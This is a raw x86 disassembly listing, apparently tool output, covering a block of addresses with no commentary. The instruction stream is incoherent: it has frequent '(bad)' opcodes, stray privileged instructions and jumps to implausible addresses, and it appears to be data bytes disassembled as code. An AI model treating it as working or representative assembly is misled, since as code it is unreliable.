  43398c:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  433992:	cld    
  433993:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  43399a:	push   0xffffff83
  43399c:	pop    edi
  43399d:	or     BYTE PTR [ebp+0x53],dh
  4339a0:	xorps  xmm1,xmm2
  4339a3:	test   BYTE PTR [eax+eax*1],bh
  4339a6:	add    BYTE PTR [eax],al
  4339a8:	adc    eax,eax
  4339aa:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  4339b2:	jmp    DWORD PTR [eax]
  4339b4:	ror    al,0x5e
  4339b7:	inc    ebp
  4339b8:	leave  
  4339b9:	xor    ecx,DWORD PTR [eax]
  4339bb:	and    DWORD PTR [ebx-0x3ec70708],ecx
  4339c1:	add    ch,al
  4339c3:	xor    edi,edi
  4339c5:	xor    DWORD PTR [ebx],0x660033fe
  4339cb:	mov    DWORD PTR [ebp-0xc],ecx
  4339ce:	pcmpgtw mm0,mm0
  4339d1:	add    dl,ah
  4339d3:	leave  
  4339d4:	mov    edi,DWORD PTR [eax-0x7d]
  4339d7:	push   ax
  4339d9:	dec    ebp
  4339da:	mov    esi,DWORD PTR [ebx-0x75]
  4339dd:	lea    ebp,[eax-0x7c00fffe]
  4339e3:	xor    eax,DWORD PTR [eax]
  4339e5:	sysret 
  4339e7:	dec    ebp
  4339e8:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  4339ef:	push   WORD PTR [ecx+0x8]
  4339f3:	jne    0x4339b6
  4339f5:	ud0    ecx,DWORD PTR [ecx]
  4339f8:	mov    edi,DWORD PTR [edx]
  4339fa:	lods   al,BYTE PTR ds:[esi]
  4339fb:	add    BYTE PTR [eax],al
  4339fd:	data16 (bad) 
  4339ff:	iret   
  433a00:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  433a07:	cli    
  433a08:	inc    ebp
  433a09:	cmp    al,0x8d
  433a0b:	add    BYTE PTR [esi+0x2d],ah
  433a0e:	inc    ebp
  433a0f:	pop    ebp
  433a10:	lea    ecx,[edi]
  433a12:	mov    dl,bh
  433a14:	add    BYTE PTR [edi],cl
  433a16:	mov    DWORD PTR [eax+eax*8],edi
  433a19:	mov    ebx,0x3a87
  433a1e:	add    BYTE PTR [ebx],ch
  433a20:	inc    ebp
  433a21:	data16 (bad) 
  433a23:	clc    
  433a24:	int3   
  433a25:	cmp    eax,DWORD PTR [eax]
  433a27:	je     0x4339b2
  433a29:	push   0xffffffc8
  433a2b:	pop    edi
  433a2c:	xchg   DWORD PTR [ebp+0x0],eax
  433a2f:	data16 add BYTE PTR [ebp+0x45],cl
  433a33:	lea    cx,[ebp+0x10]
  433a37:	jb     0x433a39
  433a39:	jmp    0x4339c4
  433a3b:	call   eax
  433a3d:	clc    
  433a3e:	xchg   DWORD PTR [edi+0x1],edi
  433a41:	mov    eax,DWORD PTR [eax]
  433a43:	or     BYTE PTR [ebp-0x49],al
  433a46:	lea    eax,[eax+0x74003154]
  433a4c:	push   edi
  433a4d:	inc    edx
  433a4e:	jge    0x433a4f
  433a50:	mov    DWORD PTR [edi],ecx
  433a52:	fdiv   DWORD PTR [edi-0x6]
  433a55:	inc    DWORD PTR [eax]
  433a57:	xor    edx,DWORD PTR [eax+0x5f]
  433a5a:	xchg   DWORD PTR [ebx+0x1],ebx
  433a5d:	ret    0x0
  433a60:	xor    BYTE PTR [ebp-0x51],cl
  433a63:	cmp    edi,0xf0ff8902
  433a69:	data16 ror al,0x84
  433a6d:	rol    BYTE PTR [eax],0x3b
  433a70:	add    al,dh
  433a72:	dec    eax
  433a73:	xchg   esp,eax
  433a74:	push   ebx
  433a75:	jmp    0x433a02
  433a77:	push   ebp
  433a78:	add    esp,ebp
  433a7a:	add    ebp,esp
  433a7c:	mov    edx,DWORD PTR [edi+0x24]
  433a7f:	clc    
  433a80:	dec    esi
  433a81:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  433a87:	cmp    BYTE PTR [ebx],al
  433a89:	jne    0x433a14
  433a8b:	xor    esp,eax
  433a8d:	jmp    0x463c10
  433a92:	add    ebp,DWORD PTR [ecx+ecx*4]
  433a95:	jne    0x433a8b
  433a97:	call   0xffcd37f1
  433a9c:	clc    
  433a9d:	xchg   edi,eax
  433a9e:	sti    
  433a9f:	add    DWORD PTR [ebx],eax
  433aa1:	add    BYTE PTR [ebp+0x47],bl
  433aa4:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  433aaa:	pop    ebp
  433aab:	mov    DWORD PTR [esi-0x48],esi
  433aae:	jmp    0x433af7
  433ab0:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  433ab6:	(bad)  
  433ab8:	cmp    al,0x0
  433aba:	cmp    eax,DWORD PTR [ebp+0x18]
  433abd:	lea    ebx,[ebp-0x56]
  433ac0:	jle    0x433ac2
  433ac2:	jae    0x433a4d
  433ac4:	mov    eax,esp
  433ac6:	call   0xb900:0x8b005587
  433acd:	inc    ebp
  433ace:	push   ebp
  433acf:	lea    ecx,[ebp-0x27ff4f12]
  433ad5:	mov    eax,edi
  433ad7:	int3   
  433ad8:	push   ebp
  433ad9:	xchg   edi,eax
  433adb:	add    esp,ebp
  433add:	add    BYTE PTR [eax],al
  433adf:	inc    ebp
  433ae0:	add    BYTE PTR [ebp+0x8b3255],cl
  433ae6:	cld    
  433ae7:	mov    DWORD PTR [edx],edi
  433ae9:	aam    0x75
  433aeb:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  433af1:	mov    DWORD PTR [ebx-0x50],edx
  433af4:	test   BYTE PTR [ebp-0x1],0xe8
  433af8:	mov    eax,DWORD PTR [eax]
  433afa:	hlt    
  433afb:	add    al,al
  433afd:	mov    eax,DWORD PTR ds:0x890045a8
  433b03:	dec    DWORD PTR [ebx+0x45fdf0e8]
  433b09:	inc    DWORD PTR [eax*2+0xf75854d]
  433b10:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  433b16:	call   0x72999857
  433b1b:	je     0x433b7b
  433b1d:	js     0x433b7e
  433b1f:	lock ret 0x7e
  433b23:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  433b29:	mov    edi,edi
  433b2b:	sbb    al,bl
  433b2d:	clc    
  433b2e:	add    BYTE PTR [ebp-0x73],bh
  433b31:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  433b37:	ror    BYTE PTR [eax],1
  433b39:	dec    ebp
  433b3a:	xchg   ebp,eax
  433b3b:	mov    edi,edi
  433b3d:	in     al,0x8b
  433b3f:	jge    0x433aca
  433b41:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  433b47:	clc    
  433b48:	pop    esi
  433b49:	fist   DWORD PTR [ebp+0x5d398b5d]
  433b4f:	clc    
  433b50:	add    al,0x6e
  433b52:	mov    eax,DWORD PTR [ebx]
  433b54:	mov    BYTE PTR [ebp+0x0],dl
  433b57:	mov    edx,DWORD PTR [ebx-0x20]
  433b5a:	adc    esi,DWORD PTR [edi+0x5e005f38]
  433b60:	add    eax,0x3b3a73
  433b65:	adc    al,0x89
  433b67:	pop    eax
  433b68:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  433b6c:	ret    0xf08
  433b6f:	cmp    al,0x2
  433b71:	mov    DWORD PTR [edx],edi
  433b73:	cld    
  433b74:	add    BYTE PTR [ebp+0x66],dl
  433b77:	add    eax,ebx
  433b79:	add    esp,eax
  433b7b:	sub    eax,eax
  433b7d:	or     BYTE PTR [ecx-0x77f474bb],cl
  433b83:	add    BYTE PTR [eax],al
  433b85:	mov    DWORD PTR [ebx-0x24],ebx
  433b88:	push   edi
  433b89:	push   ebp
  433b8a:	clc    
  433b8b:	add    DWORD PTR [esi+0x1b0100],0x45
  433b92:	out    0xff,eax
  433b94:	add    edx,DWORD PTR [eax]
  433b96:	jmp    0x433b80
  433b98:	cmp    ch,0x44
  433b9b:	(bad)  
  433b9c:	jmp    0x40c8c3ee
  433ba1:	je     0x433b2d
  433ba3:	mov    eax,DWORD PTR [eax-0x10c78104]
  433ba9:	inc    ebp
  433baa:	add    BYTE PTR [ebx-0x770375],al
  433bb0:	add    ah,ch
  433bb2:	add    edx,esp
  433bb4:	pop    edi
  433bb5:	pop    ebp
  433bb6:	push   ebp
  433bb7:	inc    ebx
  433bb8:	in     al,dx
  433bb9:	pop    ebp
  433bba:	in     al,dx
  433bbb:	cmp    edx,DWORD PTR [edi-0x8]
  433bbe:	ss xchg esp,eax
  433bc0:	pushf  
  433bc1:	pop    ebx
  433bc2:	mov    ecx,ecx
  433bc4:	call   0x899882cd
  433bc9:	in     al,dx
  433bca:	in     al,0x45
  433bcc:	dec    ebp
  433bcd:	push   esi
  433bce:	test   DWORD PTR [eax+0xfb010f],esi
  433bd4:	add    BYTE PTR [eax+0xc018b],dh
  433bda:	leave  
  433bdb:	inc    ebp
  433bdc:	test   al,ch
  433bde:	add    dh,bh
  433be0:	add    bh,bh
  433be2:	dec    ebp
  433be3:	push   cs
  433be4:	mov    DWORD PTR [ecx],eax
  433be6:	hlt    
  433be7:	push   es
  433be8:	dec    ebp
  433be9:	leave  
  433bea:	mov    DWORD PTR [eax],ecx
  433bec:	clc    
  433bed:	cmovge eax,ecx
  433bf0:	mov    ecx,0x85c2f0
  433bf6:	clc    
  433bf7:	pop    DWORD PTR [ebp+0x1]
  433bfa:	push   ebx
  433bfb:	add    BYTE PTR [ebp-0x15],bh
  433bfe:	push   esi
  433bff:	xor    eax,0x898a45
  433c04:	cld    
  433c05:	inc    BYTE PTR [ebp+0x0]
  433c08:	cmp    BYTE PTR [esi-0x64],ah
  433c0b:	add    DWORD PTR [esi+0x78308c1],edi
  433c11:	add    ah,BYTE PTR [edi-0x49]
  433c14:	int    0xbb
  433c16:	mov    ecx,DWORD PTR [edi+0xc]
  433c19:	add    dh,al
  433c1b:	cmp    ecx,ebx
  433c1d:	jne    0x433be7
  433c1f:	xor    ecx,DWORD PTR [ebp+0x66]
  433c22:	jmp    0xca3c28
  433c27:	add    DWORD PTR [ebp+0x0],eax
  433c2a:	mov    eax,ebx
  433c2c:	or     al,0x8b
  433c2e:	(bad)  
  433c2f:	mov    ecx,esi
  433c31:	mov    BYTE PTR [eax+eax*1+0x664c132],cl
  433c38:	mov    eax,edi
  433c3a:	or     BYTE PTR [edx],cl
  433c3c:	shl    cl,cl
  433c3e:	icebp  
  433c3f:	add    BYTE PTR [ebp+0x3a],0x8b
  433c43:	or     BYTE PTR [edx+eax*2],cl
  433c46:	(bad)  
  433c47:	or     cl,dh
  433c49:	stc    
  433c4a:	shl    DWORD PTR [ebp-0x30],0xc6
  433c4e:	xor    al,0x0
  433c50:	inc    ebp
  433c51:	xchg   BYTE PTR [ebx],al
  433c53:	add    esp,edi
  433c55:	add    BYTE PTR [ebp-0x39],cl
  433c58:	mov    al,bl
  433c5a:	test   DWORD PTR [ebx+0x1c348375],ecx
  433c60:	sub    al,0xbf
  433c62:	jmp    0x433be9
  433c64:	mov    edi,eax
  433c66:	lock jge 0x433c5a
  433c69:	lea    esi,[edx-0x74bad5fd]
  433c6f:	mov    ebp,esp
  433c71:	or     cl,dh
  433c73:	leave  
  433c74:	add    al,BYTE PTR [eax+eax*4-0x37ff9900]
  433c7b:	dec    ebp
  433c7c:	dec    ebp
  433c7d:	test   DWORD PTR [ebx],eax
  433c7f:	paddb  mm6,mm0
  433c82:	add    DWORD PTR [eax],eax
  433c84:	dec    ebp
  433c85:	mov    ecx,DWORD PTR [ebx-0x66b217f0]
  433c8b:	mov    esi,DWORD PTR [edx]
  433c8d:	or     al,0x2b
  433c8f:	dec    ebp
  433c90:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  433c96:	mov    esp,edx
  433c98:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  433c9f:	mov    DWORD PTR [ebx],ebp
  433ca1:	call   0xc76c5d1
  433ca6:	mov    DWORD PTR [ebp+0x10],ecx
  433ca9:	(bad)  
  433caa:	push   0x8b85ff10
  433caf:	clc    
  433cb0:	or     al,0x51
  433cb2:	(bad)  
  433cb3:	push   ecx
  433cb4:	retf   
  433cb5:	mov    ebx,0xff4d8dc8
  433cba:	mov    DWORD PTR [ebp+0x8],eax
  433cbd:	xor    eax,DWORD PTR [ebp-0x75]
  433cc0:	cmp    ebp,DWORD PTR [ebx]
  433cc2:	lsl    ebx,WORD PTR [edi-0x8]
  433cc6:	call   DWORD PTR [ebx-0x741bff75]
  433ccc:	(bad)  
  433ccd:	or     al,0x5b
  433ccf:	dec    ebp
  433cd0:	or     BYTE PTR [ebx],dh
  433cd2:	inc    ebp
  433cd3:	xor    esi,DWORD PTR ds:0x708088d
  433cd9:	in     eax,0x99
  433cdb:	add    BYTE PTR [edx],dh
  433cdd:	inc    ebp
  433cde:	pop    edi
  433cdf:	xor    eax,edx
  433ce1:	test   DWORD PTR [eax],0x81108b8b
  433ce7:	dec    ebp
  433ce8:	sub    al,0x33
  433cea:	add    BYTE PTR [ebx],dh
  433cec:	push   esi
  433ced:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  433cf3:	mov    edi,eax
  433cf5:	or     BYTE PTR [ebp+0x45],al
  433cf8:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  433cfe:	ss leave 
  433d00:	pushf  
  433d01:	push   es
  433d02:	mov    DWORD PTR [esp+edi*8+0x3a],0x4df81785
  433d0a:	inc    ebp
  433d0b:	cmp    BYTE PTR [esi],0x51
  433d0e:	pushf  
  433d0f:	addr16 (bad) 
  433d11:	shl    esp,1
  433d13:	dec    ebp
  433d14:	xchg   BYTE PTR [eax-0x3dbaae08],al
  433d1a:	(bad)  
  433d1b:	jmp    0x8c0b0ff7
  433d20:	aam    0x8
  433d22:	test   DWORD PTR [ebp-0x8],ecx
  433d25:	mov    BYTE PTR [ebp-0x75],al
  433d28:	or     BYTE PTR [eax],cl
  433d2a:	add    BYTE PTR [ebp-0x75],dl
  433d2d:	mov    eax,0xfc728b
  433d32:	dec    ebp
  433d33:	enter  0xceba,0x8
  433d37:	retf   0x1807
  433d3a:	ret    0x994d
  433d3d:	mov    esi,DWORD PTR [edx]
  433d3f:	or     al,0x33
  433d41:	into   
  433d42:	add    edx,esi
  433d44:	add    ecx,edx
  433d46:	bswap  eax
  433d48:	ror    esi,0x98
  433d4b:	dec    ebp
  433d4c:	add    cl,ch
  433d4e:	mov    edi,edi
  433d50:	hlt    
  433d51:	inc    esi
  433d53:	inc    ebp
  433d54:	ret    0x4533
  433d57:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  433d5d:	or     BYTE PTR [ebx],dh
  433d5f:	dec    ebp
  433d60:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  433d66:	jne    0xff8d3d2d
  433d6c:	inc    ebp
  433d6d:	inc    ebp
  433d6e:	mov    esi,DWORD PTR [ebx]
  433d70:	clc    
  433d71:	pop    esi
  433d72:	ret    0xcaeb
  433d75:	mov    eax,esi
  433d77:	call   0x52048f4a
  433d7c:	dec    ebp
  433d7d:	add    eax,0xf8728b
  433d82:	adc    eax,0xce0ccac9
  433d87:	push   ebp
  433d88:	ret    0xc6ec
  433d8b:	in     al,dx
  433d8c:	call   0x33438a95
  433d91:	push   edi
  433d92:	add    edi,eax
  433d94:	xor    eax,eax
  433d96:	jmp    0x433ddd
  433d98:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  433d9e:	add    eax,edi
  433da0:	shr    eax,cl
  433da2:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  433da8:	mov    edi,DWORD PTR [ecx]
  433daa:	in     al,dx
  433dab:	pushf  
  433dac:	ret    0x84c7
  433daf:	fcomp  DWORD PTR [ecx-0x7607cd7b]
  433db5:	inc    ebp
  433db6:	in     al,dx
  433db7:	ss inc ebp
  433db9:	pushf  
  433dba:	mov    eax,edi
  433dbc:	cld    
  433dbd:	fmul   st(2),st
  433dbf:	sbb    dl,al
  433dc1:	jmp    0x9c3b:0x374d45c1
  433dc8:	jbe    0x433d91
  433dca:	mov    esp,eax
  433dcc:	clc    
  433dcd:	add    BYTE PTR [ebp+0x0],cl
  433dd0:	mov    ecx,ecx
  433dd2:	lea    eax,[ebp-0x5]
  433dd5:	mov    edi,edi
  433dd7:	call   0x51ce8f21
  433ddc:	hlt    
  433ddd:	xor    eax,edx
  433ddf:	mov    esi,0x997284
  433de4:	xor    cl,dl
  433de6:	mov    esi,eax
  433de8:	hlt    
  433de9:	into   
  433dea:	inc    ebp
  433deb:	scas   eax,DWORD PTR es:[edi]
  433dec:	mov    ebp,ecx
  433dee:	cld    
  433def:	add    dl,cl
  433df1:	add    dl,al
  433df3:	inc    ebp
  433df4:	shr    DWORD PTR [ebx],0x4d
  433df7:	xor    edi,DWORD PTR [ebx]
  433df9:	mov    DWORD PTR [edi],ecx
  433dfb:	clc    
  433dfc:	dec    esi
  433dfd:	inc    ebp
  433dfe:	dec    DWORD PTR [ebx-0x3d2b1775]
  433e04:	ret    0xc6ca
  433e07:	mov    BYTE PTR [ebp-0x32],0x53
  433e0b:	scas   eax,DWORD PTR es:[edi]
  433e0c:	inc    ebp
  433e0d:	jmp    0x433e46
  433e0f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433e16:	pop    ebx
  433e17:	xor    ecx,DWORD PTR [ebp+0x3]
  433e1a:	mov    eax,DWORD PTR [ebx]
  433e1c:	clc    
  433e1d:	test   edx,ecx
  433e1f:	mov    ecx,esi
  433e21:	cld    
  433e22:	call   0x8ab7836c
  433e27:	xor    ecx,DWORD PTR [eax+0x4533f303]
  433e2d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  433e33:	fdiv   QWORD PTR [ebx]
  433e35:	retf   0xce89
  433e38:	in     al,0xc1
  433e3a:	inc    ebp
  433e3b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  433e41:	into   
  433e42:	mov    dh,0xc1
  433e45:	call   0x8c1783ce
  433e4a:	(bad)  
  433e4b:	cld    
  433e4c:	mov    ecx,DWORD PTR [ebp-0x14]
  433e4f:	xor    eax,ecx
  433e51:	lea    eax,[ebp+0x8]
  433e54:	mov    esi,DWORD PTR [edx-0x4]
  433e57:	add    dl,al
  433e59:	inc    ebp
  433e5a:	mov    esp,0x32d8998b
  433e5f:	dec    ebp
  433e60:	mov    esi,DWORD PTR [ebx]
  433e62:	cld    
  433e63:	xor    eax,edx
  433e65:	sub    esp,DWORD PTR [edi-0x75]
  433e68:	int    0xec
  433e6a:	sub    ecx,eax
  433e6c:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  433e72:	mov    esi,esp
  433e74:	call   0x34178bfd
  433e79:	inc    DWORD PTR [ebx]
  433e7b:	mov    edi,DWORD PTR [ebx]
  433e7d:	cld    
  433e7e:	jne    0x433ecd
  433e80:	mov    esi,DWORD PTR [ebx]
  433e82:	aam    0x8d
  433e84:	dec    ebp
  433e85:	or     BYTE PTR [ebx],dh
  433e87:	jb     0x433e8c
  433e89:	add    BYTE PTR [edi+0x45],bl
  433e8c:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  433e93:	xor    ebp,esp
  433e95:	xor    eax,edi
  433e97:	sub    edi,esp
  433e99:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  433e9f:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433ea6:	inc    ebp
  433ea7:	xor    ecx,DWORD PTR [ecx+0x45891403]
  433ead:	clc    
  433eae:	mov    eax,edi
  433eb0:	nop
  433eb1:	fadd   QWORD PTR [eax]
  433eb3:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433eb9:	jmp    0x433e44
  433ebb:	mov    eax,DWORD PTR [ecx]
  433ebd:	fadd   DWORD PTR [eax]
  433ebf:	inc    ebp
  433ec0:	or     DWORD PTR [ebx],esi
  433ec2:	dec    eax
  433ec3:	add    edx,DWORD PTR [ebx-0x2d]
  433ec6:	dec    ebp
  433ec7:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  433ecd:	inc    ebp
  433ece:	push   ecx
  433ecf:	mov    dl,BYTE PTR [ecx-0xd]
  433ed2:	xor    ecx,DWORD PTR [ebp-0x45]
  433ed5:	(bad)  
  433ed7:	rol    BYTE PTR [eax],0xc1
  433eda:	ret    
  433edb:	inc    ebp
  433edc:	inc    ebp
  433edd:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433ee3:	xor    eax,ebx
  433ee5:	add    eax,DWORD PTR [ebp+0x23]
  433ee8:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  433eee:	cmp    edi,0xc
  433ef1:	dec    ebp
  433ef2:	inc    ebp
  433ef3:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433ef9:	inc    ebp
  433efa:	mov    esi,DWORD PTR [ebx]
  433efc:	clc    
  433efd:	lea    eax,[ebp+0x45725407]
  433f03:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433f07:	xor    edi,DWORD PTR [eax]
  433f09:	mov    ecx,0xff8b8d4d
  433f0e:	push   esp
  433f0f:	enter  0x4df7,0x23
  433f13:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433f19:	mov    eax,DWORD PTR [ebx]
  433f1b:	loopne 0x433f08
  433f1d:	ret    0xc68b
  433f20:	push   esp
  433f21:	enter  0x9745,0x8b
  433f25:	inc    ebp
  433f26:	cld    
  433f27:	mov    eax,edi
  433f29:	clc    
  433f2a:	ret    
  433f2b:	ret    0xc645
  433f2e:	mov    esi,DWORD PTR [ebx]
  433f30:	cld    
  433f31:	pop    esi
  433f32:	mov    ebx,0x83458bc3
  433f38:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  433f3c:	dec    ebp
  433f3d:	xor    ebx,DWORD PTR ss:[ebx+eax*1-0x767a7646]
  433f45:	clc    
  433f46:	fcom   DWORD PTR [ebp+0x45]
  433f49:	mov    edi,DWORD PTR [eax]
  433f4b:	adc    al,0x9c
  433f4d:	inc    ebp
  433f4e:	(bad)  
  433f4f:	mov    ebx,eax
  433f51:	adc    al,0x85
  433f53:	cmp    al,0x1
  433f56:	inc    ebp
  433f57:	add    BYTE PTR [edx],bh
  433f59:	dec    ebp
  433f5a:	pushf  
  433f5b:	mov    ebp,ecx
  433f5d:	mov    eax,DWORD PTR [ebx]
  433f5f:	nop
  433f60:	add    BYTE PTR [eax],al
  433f62:	inc    ebp
  433f63:	mov    esi,DWORD PTR [ebx]
  433f65:	add    eax,DWORD PTR [ebx]
  433f67:	cmp    al,0x89
  433f69:	mov    esp,esi
  433f6b:	clc    
  433f6c:	inc    ebp
  433f6d:	inc    ebp
  433f6e:	add    edx,DWORD PTR [esi+0xc]
  433f71:	mov    edi,0x7ff0845
  433f76:	in     al,dx
  433f77:	(bad)  
  433f78:	jne    0x433f13
  433f7a:	mov    esi,DWORD PTR [edx]
  433f7c:	clc    
  433f7d:	add    ebp,DWORD PTR [esi]
  433f7f:	mov    edi,edi
  433f81:	in     al,dx
  433f82:	mov    DWORD PTR [ebp-0x10],eax
  433f85:	xor    eax,DWORD PTR [ebp+0x3]
  433f88:	mov    DWORD PTR ds:[esp+esi*8-0x7427ba75],ebx
  433f90:	(bad)  
  433f91:	push   eax
  433f92:	ret    
  433f93:	call   0xd4ffc925
  433f98:	call   0xffcf37e2
  433f9d:	cmp    BYTE PTR [ebp+0x4d],al
  433fa0:	test   DWORD PTR [eax+0x74],ecx
  433fa3:	inc    ecx
  433fa4:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  433faa:	ret    
  433fab:	inc    eax
  433fac:	dec    DWORD PTR [ebx+0x4945f8f0]
  433fb2:	push   eax
  433fb3:	dec    eax
  433fb4:	test   al,0xd0
  433fb6:	dec    eax
  433fb8:	mov    eax,DWORD PTR [ebp-0x14]
  433fbb:	mov    eax,DWORD PTR [ebp+0x38]
  433fbe:	mov    eax,ecx
  433fc0:	fadd   DWORD PTR [ebx]
  433fc2:	dec    ebp
  433fc3:	inc    eax
  433fc4:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  433fca:	inc    ebp
  433fcb:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433fd1:	fadd   QWORD PTR [ebx]
  433fd3:	inc    ebp
  433fd4:	or     al,0x33
  433fd6:	dec    ebp
  433fd7:	add    edi,DWORD PTR [ebx]
  433fd9:	mov    DWORD PTR [edx-0x28],esi
  433fdc:	mov    eax,DWORD PTR [ebp-0x10]
  433fdf:	mov    eax,DWORD PTR [eax+0x10]
  433fe2:	mov    eax,edi
  433fe4:	lock ret 
  433fe6:	inc    ecx
  433fe7:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433fed:	fsubr  st,st(5)
  433fef:	test   DWORD PTR [eax],eax
  433ff1:	clc    
  433ff2:	push   0x45
  433ff4:	(bad)  
  433ff5:	cmp    ebp,esp
  433ff7:	pushf  
  433ff8:	inc    ebp
  433ff9:	(bad)  
  433ffa:	push   eax
  433ffb:	fsub   DWORD PTR [eax-0x7b]
  433ffe:	(bad)  
  433fff:	clc    
  434000:	mov    eax,0xf8008584
  434005:	mov    eax,DWORD PTR [ebp-0x4]
  434008:	mov    edi,0x4585c3cc
  43400e:	clc    
  43400f:	mov    eax,DWORD PTR [ebp+0x14]
  434012:	cmp    BYTE PTR [ebp-0x64],al
  434015:	mov    edi,eax
  434017:	in     al,dx
  434018:	les    esi,FWORD PTR [ebp-0x7b]
  43401b:	mov    edi,eax
  43401d:	or     al,0x4d
  43401f:	dec    ebp
  434020:	mov    eax,ebp
  434022:	in     al,0xf2
  434024:	dec    ebp
  434025:	dec    DWORD PTR [ecx+0x4dc7e045]
  43402b:	fmul   DWORD PTR [ecx+0x4df8f085]
  434031:	inc    ebp
  434032:	mov    DWORD PTR [ebx],esi
  434034:	fadd   QWORD PTR [ebx]
  434036:	dec    ebp
  434037:	push   eax
  434038:	xor    eax,DWORD PTR [ebp+0x3]
  43403b:	push   eax
  43403c:	mov    DWORD PTR [eax+ebx*8],ebx
  43403f:	push   esi
  434041:	mov    eax,DWORD PTR [eax]
  434043:	lock cmp eax,0xf84e85c0
  434049:	inc    ebp
  43404a:	test   BYTE PTR [ebx],dh
  43404c:	add    DWORD PTR [ebx],eax
  43404e:	add    BYTE PTR [eax+0x4d],dl
  434051:	jne    0x434086
  434053:	lea    ecx,[ebx-0x7617fc44]
  434059:	div    ah
  43405b:	inc    DWORD PTR [ebp+0x45]
  43405e:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  434064:	jb     0x433ff1
  434066:	add    BYTE PTR [eax*2-0x17ba743f],cl
  43406d:	mov    ecx,DWORD PTR [ebp-0x10]
  434070:	xor    ecx,DWORD PTR [ebp+0x3]
  434073:	mov    edi,DWORD PTR [ebx]
  434075:	adc    BYTE PTR [ebp+0x41],dh
  434078:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43407e:	ret    
  43407f:	push   ss
  434080:	push   0x45
  434082:	lea    ecx,[ebx+0x4de80cb0]
  434088:	sti    
  434089:	add    edi,edi
  43408b:	or     BYTE PTR [ebp+0x4d],al
  43408e:	mov    ebp,DWORD PTR [ebx]
  434090:	xor    ebp,ecx
  434092:	mov    al,BYTE PTR [edx]
  434094:	add    eax,0xc7200
  434099:	jne    0x4340e8
  43409b:	lea    esi,[ebx]
  43409d:	mov    al,0xf
  43409f:	call   0xf3764
  4340a4:	shl    DWORD PTR [esi],0x84
  4340a7:	pushf  
  4340a8:	add    DWORD PTR [ecx+0x4545d000],ecx
  4340ae:	mov    edi,DWORD PTR [ecx]
  4340b0:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4340b7:	test   DWORD PTR [eax],eax
  4340b9:	clc    
  4340ba:	dec    ebp
  4340bb:	inc    ebp
  4340bc:	xor    edi,DWORD PTR [ebx]
  4340be:	setl   al
  4340c1:	(bad)  
  4340c2:	retf   
  4340c3:	rol    cl,1
  4340c5:	dec    ebp
  4340c6:	test   BYTE PTR [ebp+0x4d00cc01],cl
  4340cc:	inc    ebp
  4340cd:	lea    ecx,[ebx-0x75b2cc38]
  4340d3:	lea    eax,ds:0x4d72c4
  4340d9:	mov    ecx,DWORD PTR [ebp-0x4]
  4340dc:	xor    ecx,edi
  4340de:	bswap  ebx
  4340e0:	ror    BYTE PTR [ebp-0x35],0xe9
  4340e4:	rol    DWORD PTR [ecx],0x84
  4340e7:	add    BYTE PTR [ecx],al
  4340e9:	cmp    BYTE PTR [eax],al
  4340eb:	pushf  
  4340ec:	inc    ebp
  4340ed:	jnp    0x8a4374f0
  4340f3:	mov    eax,DWORD PTR ds:0xcf72e8
  4340f9:	lock dec ebp
  4340fb:	retf   
  4340fc:	xor    ecx,DWORD PTR [ebp+0xf]
  4340ff:	mov    eax,eax
  434101:	fmul   st,st(3)
  434103:	test   ecx,0x1998484
  434109:	xor    al,BYTE PTR [eax]
  43410b:	mov    DWORD PTR [ebp-0x28],eax
  43410e:	mov    eax,DWORD PTR [ebp+0x33]
  434111:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  434117:	ret    
  434118:	add    al,cl
  43411a:	dec    ebp
  43411b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  434121:	add    ecx,DWORD PTR ds:0xc7250
  434127:	inc    ebp
  434128:	rcl    DWORD PTR [eax+0x4d],0x2b
  43412c:	mov    edi,edi
  43412e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  434134:	jb     0x4340fd
  434136:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  43413d:	mov    esi,DWORD PTR [ebx]
  43413f:	cld    
  434140:	mov    cl,bh
  434142:	or     eax,0x372b6
  434147:	cmp    ecx,eax
  434149:	jne    0x4341c6
  43414f:	mov    eax,DWORD PTR [ebp-0x20]
  434152:	mov    eax,DWORD PTR [eax]
